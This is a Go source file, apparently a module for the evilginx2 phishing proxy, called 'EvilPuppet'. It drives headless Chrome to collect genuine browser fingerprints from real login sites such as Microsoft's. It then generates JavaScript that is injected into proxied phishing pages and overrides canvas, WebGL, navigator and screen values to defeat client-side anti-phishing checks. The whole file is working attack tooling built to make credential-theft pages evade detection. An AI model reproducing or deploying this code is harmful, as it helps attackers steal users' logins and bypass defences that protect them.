package core

import (
	"context"
	"encoding/json"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/kgretzky/evilginx2/log"
)

// Telemetry holds real browser fingerprint data extracted from a headless Chrome instance.
// This data is injected into proxied phishing pages to fool client-side anti-phishing checks
// that verify browser telemetry (canvas, WebGL, navigator, screen, etc.).
type Telemetry struct {
	// Canvas fingerprint
	CanvasHash string `json:"canvas_hash"`
	CanvasData string `json:"canvas_data"`

	// WebGL renderer info
	WebGLVendor   string `json:"webgl_vendor"`
	WebGLRenderer string `json:"webgl_renderer"`

	// Navigator properties
	UserAgent     string `json:"user_agent"`
	Platform      string `json:"platform"`
	Languages     string `json:"languages"`
	HardwareConcurrency int    `json:"hardware_concurrency"`
	DeviceMemory  int    `json:"device_memory"`
	MaxTouchPoints int   `json:"max_touch_points"`

	// Screen properties
	ScreenWidth  int `json:"screen_width"`
	ScreenHeight int `json:"screen_height"`
	ColorDepth   int `json:"color_depth"`
	PixelRatio   float64 `json:"pixel_ratio"`

	// Performance timings
	PerformanceEntries string `json:"performance_entries"`

	// Plugin and mime type info
	PluginCount  int    `json:"plugin_count"`
	MimeTypes    string `json:"mime_types"`

	// Collected at
	CollectedAt time.Time `json:"collected_at"`
	TargetURL   string    `json:"target_url"`
}

// PuppetInstance represents a single managed headless Chrome browser tab.
type PuppetInstance struct {
	ctx       context.Context
	cancel    context.CancelFunc
	allocCtx  context.Context
	allocCancel context.CancelFunc
	telemetry *Telemetry
	targetURL string
	lastUsed  time.Time
	ready     bool
	mu        sync.Mutex
}

// EvilPuppet manages a pool of headless Chrome instances that generate
// real browser telemetry for injection into proxied phishing sessions.
type EvilPuppet struct {
	enabled     bool
	poolSize    int
	refreshMins int
	pool        []*PuppetInstance
	cache       map[string]*Telemetry // keyed by phishlet/target domain
	cacheMu     sync.RWMutex
	mu          sync.Mutex
	chromePath  string
	stopped     atomic.Bool
	running     bool
}

// NewEvilPuppet creates a new EvilPuppet manager.
// It does NOT start the browser pool — call Start() for that.
func NewEvilPuppet(poolSize, refreshMins int) *EvilPuppet {
	if poolSize <= 0 {
		poolSize = 2
	}
	if refreshMins <= 0 {
		refreshMins = 30
	}
	ep := &EvilPuppet{
		enabled:     false,
		poolSize:    poolSize,
		refreshMins: refreshMins,
		pool:        make([]*PuppetInstance, 0),
		cache:       make(map[string]*Telemetry),
	}
	ep.stopped.Store(true)
	return ep
}

// SetEnabled toggles Evilpuppet on/off.
func (ep *EvilPuppet) SetEnabled(enabled bool) {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	ep.enabled = enabled
}

// IsEnabled returns whether Evilpuppet is active.
func (ep *EvilPuppet) IsEnabled() bool {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	return ep.enabled
}

// SetPoolSize changes the number of browser instances in the pool.
func (ep *EvilPuppet) SetPoolSize(size int) {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	if size > 0 && size <= 10 {
		ep.poolSize = size
	}
}

// GetPoolSize returns the configured pool size.
func (ep *EvilPuppet) GetPoolSize() int {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	return ep.poolSize
}

// SetRefreshMins sets how often telemetry is refreshed.
func (ep *EvilPuppet) SetRefreshMins(mins int) {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	if mins >= 5 {
		ep.refreshMins = mins
	}
}

// GetRefreshMins returns the refresh interval.
func (ep *EvilPuppet) GetRefreshMins() int {
	ep.mu.Lock()
	defer ep.mu.Unlock()
	return ep.refreshMins
}

// Start initializes the Chrome browser pool and begins background telemetry collection.
func (ep *EvilPuppet) Start() error {
	ep.mu.Lock()
	if ep.running {
		ep.mu.Unlock()
		return fmt.Errorf("evilpuppet already running")
	}
	ep.running = true
	ep.mu.Unlock()

	// Verify Chrome/Chromium is available
	testCtx, testCancel := chromedp.NewExecAllocator(context.Background(),
		append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Flag("headless", true),
			chromedp.Flag("disable-gpu", true),
			chromedp.Flag("no-sandbox", true),
			chromedp.Flag("disable-dev-shm-usage", true),
			chromedp.Flag("disable-web-security", false),
			chromedp.Flag("disable-extensions", true),
			chromedp.Flag("disable-default-apps", true),
			chromedp.Flag("disable-background-networking", false),
			chromedp.Flag("disable-sync", true),
			chromedp.Flag("disable-translate", true),
			chromedp.Flag("metrics-recording-only", true),
			chromedp.Flag("mute-audio", true),
			chromedp.Flag("safebrowsing-disable-auto-update", true),
			chromedp.WindowSize(1920, 1080),
			chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
		)...,
	)
	testBrowserCtx, testBrowserCancel := chromedp.NewContext(testCtx)

	// Quick health check: navigate to about:blank
	err := chromedp.Run(testBrowserCtx, chromedp.Navigate("about:blank"))
	testBrowserCancel()
	testCancel()
	if err != nil {
		ep.mu.Lock()
		ep.running = false
		ep.mu.Unlock()
		return fmt.Errorf("chrome not available: %v — install with: apt-get install -y chromium-browser", err)
	}

	log.Success("[puppet] Chrome verified — starting browser pool (size: %d)", ep.poolSize)

	ep.stopped.Store(false)

	// Start the refresh loop in background
	go ep.refreshLoop()

	return nil
}

// Stop shuts down all browser instances and stops the refresh loop.
func (ep *EvilPuppet) Stop() {
	ep.mu.Lock()
	if !ep.running {
		ep.mu.Unlock()
		return
	}
	ep.running = false
	ep.mu.Unlock()

	// Signal refreshLoop to stop via atomic flag (safe to call multiple times)
	ep.stopped.Store(true)

	// Kill all browser instances
	for _, inst := range ep.pool {
		inst.mu.Lock()
		if inst.cancel != nil {
			inst.cancel()
		}
		if inst.allocCancel != nil {
			inst.allocCancel()
		}
		inst.mu.Unlock()
	}

	ep.mu.Lock()
	ep.pool = make([]*PuppetInstance, 0)
	ep.mu.Unlock()

	log.Info("[puppet] Browser pool stopped")
}

// refreshLoop periodically collects fresh telemetry for all cached targets.
func (ep *EvilPuppet) refreshLoop() {
	// Initial collection happens on first GetTelemetry call
	ticker := time.NewTicker(time.Duration(ep.refreshMins) * time.Minute)
	defer ticker.Stop()

	for {
		if ep.stopped.Load() {
			return
		}
		select {
		case <-ticker.C:
			if ep.stopped.Load() {
				return
			}
			ep.cacheMu.RLock()
			targets := make([]string, 0, len(ep.cache))
			for url := range ep.cache {
				targets = append(targets, url)
			}
			ep.cacheMu.RUnlock()

			for _, targetURL := range targets {
				if ep.stopped.Load() {
					return
				}
				log.Info("[puppet] Refreshing telemetry for %s", targetURL)
				t, err := ep.collectTelemetry(targetURL)
				if err != nil {
					log.Error("[puppet] Refresh failed for %s: %v", targetURL, err)
					continue
				}
				ep.cacheMu.Lock()
				ep.cache[targetURL] = t
				ep.cacheMu.Unlock()
				log.Success("[puppet] Telemetry refreshed for %s", targetURL)
			}
		}
	}
}

// GetTelemetry returns cached telemetry for a target URL, collecting fresh data if needed.
// This is the main entry point called from http_proxy.go during response injection.
func (ep *EvilPuppet) GetTelemetry(targetURL string) (*Telemetry, error) {
	if !ep.IsEnabled() {
		return nil, fmt.Errorf("evilpuppet disabled")
	}

	// Check cache first
	ep.cacheMu.RLock()
	if t, ok := ep.cache[targetURL]; ok {
		ep.cacheMu.RUnlock()
		return t, nil
	}
	ep.cacheMu.RUnlock()

	// Collect fresh telemetry
	log.Info("[puppet] Collecting telemetry for new target: %s", targetURL)
	t, err := ep.collectTelemetry(targetURL)
	if err != nil {
		return nil, err
	}

	// Cache it
	ep.cacheMu.Lock()
	ep.cache[targetURL] = t
	ep.cacheMu.Unlock()

	log.Success("[puppet] Telemetry collected and cached for %s", targetURL)
	return t, nil
}

// collectTelemetry spins up a headless Chrome, navigates to the target, and extracts
// real browser fingerprint data.
func (ep *EvilPuppet) collectTelemetry(targetURL string) (*Telemetry, error) {
	// Create a new browser context with realistic options
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-translate", true),
		chromedp.Flag("mute-audio", true),
		chromedp.Flag("safebrowsing-disable-auto-update", true),
		chromedp.WindowSize(1920, 1080),
		chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	ctx, cancel := chromedp.NewContext(allocCtx)

	// Set overall timeout for collection
	ctx, timeoutCancel := context.WithTimeout(ctx, 60*time.Second)

	defer func() {
		timeoutCancel()
		cancel()
		allocCancel()
	}()

	var telemetryJSON string

	// The extraction script — runs in the real browser on the real target page.
	// This is what makes Evilpuppet powerful: the telemetry comes from an actual
	// Chrome instance visiting the actual target site, so all values are genuine.
	extractScript := `
	(function() {
		var t = {};

		// Canvas fingerprint
		try {
			var c = document.createElement('canvas');
			c.width = 280; c.height = 60;
			var ctx = c.getContext('2d');
			ctx.textBaseline = 'top';
			ctx.font = '14px Arial';
			ctx.fillStyle = '#f60';
			ctx.fillRect(125,1,62,20);
			ctx.fillStyle = '#069';
			ctx.fillText('Evilpuppet,canvastest!', 2, 15);
			ctx.fillStyle = 'rgba(102,204,0,0.7)';
			ctx.fillText('Evilpuppet,canvastest!', 4, 17);
			t.canvas_data = c.toDataURL();
			// Simple hash
			var d = c.toDataURL();
			var h = 0;
			for (var i = 0; i < d.length; i++) {
				h = ((h << 5) - h) + d.charCodeAt(i);
				h |= 0;
			}
			t.canvas_hash = h.toString();
		} catch(e) { t.canvas_hash = ''; t.canvas_data = ''; }

		// WebGL
		try {
			var gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
			if (gl) {
				var ext = gl.getExtension('WEBGL_debug_renderer_info');
				t.webgl_vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
				t.webgl_renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
			} else {
				t.webgl_vendor = ''; t.webgl_renderer = '';
			}
		} catch(e) { t.webgl_vendor = ''; t.webgl_renderer = ''; }

		// Navigator
		t.user_agent = navigator.userAgent || '';
		t.platform = navigator.platform || '';
		t.languages = JSON.stringify(navigator.languages || []);
		t.hardware_concurrency = navigator.hardwareConcurrency || 0;
		t.device_memory = navigator.deviceMemory || 0;
		t.max_touch_points = navigator.maxTouchPoints || 0;

		// Screen
		t.screen_width = screen.width || 0;
		t.screen_height = screen.height || 0;
		t.color_depth = screen.colorDepth || 0;
		t.pixel_ratio = window.devicePixelRatio || 1;

		// Performance (navigation timing)
		try {
			var perf = performance.getEntriesByType('navigation');
			if (perf && perf.length > 0) {
				var p = perf[0];
				t.performance_entries = JSON.stringify({
					connectEnd: p.connectEnd,
					connectStart: p.connectStart,
					domComplete: p.domComplete,
					domContentLoadedEventEnd: p.domContentLoadedEventEnd,
					domContentLoadedEventStart: p.domContentLoadedEventStart,
					domInteractive: p.domInteractive,
					domainLookupEnd: p.domainLookupEnd,
					domainLookupStart: p.domainLookupStart,
					duration: p.duration,
					fetchStart: p.fetchStart,
					loadEventEnd: p.loadEventEnd,
					loadEventStart: p.loadEventStart,
					redirectEnd: p.redirectEnd,
					redirectStart: p.redirectStart,
					requestStart: p.requestStart,
					responseEnd: p.responseEnd,
					responseStart: p.responseStart,
					secureConnectionStart: p.secureConnectionStart,
					transferSize: p.transferSize,
					encodedBodySize: p.encodedBodySize,
					decodedBodySize: p.decodedBodySize
				});
			} else {
				t.performance_entries = '{}';
			}
		} catch(e) { t.performance_entries = '{}'; }

		// Plugins
		t.plugin_count = navigator.plugins ? navigator.plugins.length : 0;
		try {
			var mimes = [];
			for (var i = 0; i < navigator.mimeTypes.length && i < 20; i++) {
				mimes.push(navigator.mimeTypes[i].type);
			}
			t.mime_types = JSON.stringify(mimes);
		} catch(e) { t.mime_types = '[]'; }

		return JSON.stringify(t);
	})();
	`

	err := chromedp.Run(ctx,
		// Navigate to the real target (e.g., https://login.microsoftonline.com)
		chromedp.Navigate(targetURL),
		// Wait for DOM to be ready
		chromedp.WaitReady("body", chromedp.ByQuery),
		// Give the page time to fully initialize JS environment
		chromedp.Sleep(3*time.Second),
		// Extract all telemetry in one shot
		chromedp.EvaluateAsDevTools(extractScript, &telemetryJSON),
	)
	if err != nil {
		return nil, fmt.Errorf("telemetry collection failed: %v", err)
	}

	// Parse the JSON result
	var raw map[string]interface{}
	if err := json.Unmarshal([]byte(telemetryJSON), &raw); err != nil {
		return nil, fmt.Errorf("failed to parse telemetry JSON: %v", err)
	}

	t := &Telemetry{
		CanvasHash:          getString(raw, "canvas_hash"),
		CanvasData:          getString(raw, "canvas_data"),
		WebGLVendor:         getString(raw, "webgl_vendor"),
		WebGLRenderer:       getString(raw, "webgl_renderer"),
		UserAgent:           getString(raw, "user_agent"),
		Platform:            getString(raw, "platform"),
		Languages:           getString(raw, "languages"),
		HardwareConcurrency: getInt(raw, "hardware_concurrency"),
		DeviceMemory:        getInt(raw, "device_memory"),
		MaxTouchPoints:      getInt(raw, "max_touch_points"),
		ScreenWidth:         getInt(raw, "screen_width"),
		ScreenHeight:        getInt(raw, "screen_height"),
		ColorDepth:          getInt(raw, "color_depth"),
		PixelRatio:          getFloat(raw, "pixel_ratio"),
		PerformanceEntries:  getString(raw, "performance_entries"),
		PluginCount:         getInt(raw, "plugin_count"),
		MimeTypes:           getString(raw, "mime_types"),
		CollectedAt:         time.Now(),
		TargetURL:           targetURL,
	}

	return t, nil
}

// GenerateInjectionScript creates the JavaScript that overrides browser properties
// with real telemetry values. This script is injected BEFORE the page's own JS runs.
func (ep *EvilPuppet) GenerateInjectionScript(t *Telemetry) string {
	if t == nil {
		return ""
	}

	// This script overrides the browser APIs that anti-phishing checks probe.
	// Because the values come from a real Chrome visiting the real site,
	// they pass all consistency checks.
	script := fmt.Sprintf(`
(function(){
	// --- Canvas fingerprint override ---
	var _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
	var _puppetCanvasData = %q;
	if (_puppetCanvasData) {
		HTMLCanvasElement.prototype.toDataURL = function(type) {
			if (this.width <= 300 && this.height <= 100) {
				return _puppetCanvasData;
			}
			return _origToDataURL.apply(this, arguments);
		};
	}

	// --- WebGL override ---
	var _origGetParam = null;
	try {
		var _tmpCanvas = document.createElement('canvas');
		var _tmpGl = _tmpCanvas.getContext('webgl') || _tmpCanvas.getContext('experimental-webgl');
		if (_tmpGl) {
			_origGetParam = _tmpGl.__proto__.getParameter;
			_tmpGl.__proto__.getParameter = function(param) {
				// UNMASKED_VENDOR_WEBGL = 0x9245, UNMASKED_RENDERER_WEBGL = 0x9246
				if (param === 0x9245 || param === 37445) return %q;
				if (param === 0x9246 || param === 37446) return %q;
				return _origGetParam.apply(this, arguments);
			};
		}
	} catch(e) {}

	// --- Navigator overrides ---
	try {
		Object.defineProperty(navigator, 'hardwareConcurrency', {get: function(){return %d;}});
	} catch(e) {}
	try {
		Object.defineProperty(navigator, 'deviceMemory', {get: function(){return %d;}});
	} catch(e) {}
	try {
		Object.defineProperty(navigator, 'maxTouchPoints', {get: function(){return %d;}});
	} catch(e) {}
	try {
		Object.defineProperty(navigator, 'platform', {get: function(){return %q;}});
	} catch(e) {}
	try {
		Object.defineProperty(navigator, 'languages', {get: function(){return %s;}});
	} catch(e) {}

	// --- Screen overrides ---
	try {
		Object.defineProperty(screen, 'width', {get: function(){return %d;}});
		Object.defineProperty(screen, 'height', {get: function(){return %d;}});
		Object.defineProperty(screen, 'colorDepth', {get: function(){return %d;}});
		Object.defineProperty(window, 'devicePixelRatio', {get: function(){return %f;}});
	} catch(e) {}

	// --- Plugin count override ---
	try {
		Object.defineProperty(navigator, 'plugins', {get: function(){
			var p = {length: %d};
			return p;
		}});
	} catch(e) {}
})();
`,
		t.CanvasData,
		t.WebGLVendor,
		t.WebGLRenderer,
		t.HardwareConcurrency,
		t.DeviceMemory,
		t.MaxTouchPoints,
		t.Platform,
		t.Languages, // already JSON array string
		t.ScreenWidth,
		t.ScreenHeight,
		t.ColorDepth,
		t.PixelRatio,
		t.PluginCount,
	)

	return script
}

// GetStatus returns a human-readable status string for the terminal.
func (ep *EvilPuppet) GetStatus() string {
	ep.mu.Lock()
	defer ep.mu.Unlock()

	if !ep.enabled {
		return "disabled"
	}
	if !ep.running {
		return "enabled (not started)"
	}

	ep.cacheMu.RLock()
	cacheCount := len(ep.cache)
	ep.cacheMu.RUnlock()

	return fmt.Sprintf("running (pool: %d, cached: %d targets, refresh: %dm)",
		ep.poolSize, cacheCount, ep.refreshMins)
}

// ClearCache removes all cached telemetry, forcing re-collection.
func (ep *EvilPuppet) ClearCache() {
	ep.cacheMu.Lock()
	ep.cache = make(map[string]*Telemetry)
	ep.cacheMu.Unlock()
	log.Info("[puppet] Telemetry cache cleared")
}

// --- Helper functions for JSON parsing ---

func getString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func getInt(m map[string]interface{}, key string) int {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return 0
}

func getFloat(m map[string]interface{}, key string) float64 {
	if v, ok := m[key]; ok {
		if f, ok := v.(float64); ok {
			return f
		}
	}
	return 1.0
}
